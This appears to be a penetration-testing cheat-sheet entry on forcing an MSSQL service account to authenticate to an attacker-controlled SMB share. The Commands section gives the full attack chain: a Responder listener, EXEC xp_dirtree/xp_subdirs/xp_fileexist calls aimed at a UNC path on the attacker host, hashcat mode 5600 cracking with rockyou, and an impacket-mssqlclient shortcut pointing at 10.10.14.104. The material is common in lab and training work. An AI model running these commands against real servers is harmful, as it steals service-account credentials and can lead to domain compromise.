# 17.11 MSSQL UNC Path Injection NetNTLMv2 Capture

> Trigger NetNTLMv2 capture via `xp_dirtree`/`xp_subdirs`/`xp_fileexist` UNC resolution — catch with Responder and crack offline.

## Overview

Undocumented extended stored procedures xp_dirtree, xp_subdirs, and xp_fileexist resolve UNC paths, forcing the MSSQL service account to authenticate against an attacker-controlled SMB share. Capture the resulting NetNTLMv2 hash with Responder and crack it offline.

## Steps

- Start Responder on the attacker interface to capture incoming SMB authentication
- Use any of xp_dirtree, xp_subdirs, or xp_fileexist with a UNC path pointing to your machine
- Responder captures the NetNTLMv2 hash of the MSSQL service account
- Crack with hashcat mode 5600 and rockyou; cracked account may have domain privileges
- In impacket-mssqlclient use the built-in xp_dirtree command shortcut

## Commands

### Start Responder

```bash
sudo responder -I tun0 -v
```

### Trigger UNC auth via stored procedures

```sql
EXEC xp_dirtree '\\<IP>\a'; EXEC xp_subdirs '\\<IP>\a'; EXEC xp_fileexist '\\<IP>\a';
```

### Crack captured hash

```bash
hashcat -m 5600 '<SNIP>' /usr/share/wordlists/rockyou.txt
```

### impacket-mssqlclient shortcut

```text
SQL (ws_dev  guest@master)> xp_dirtree \\10.10.14.104\a
```
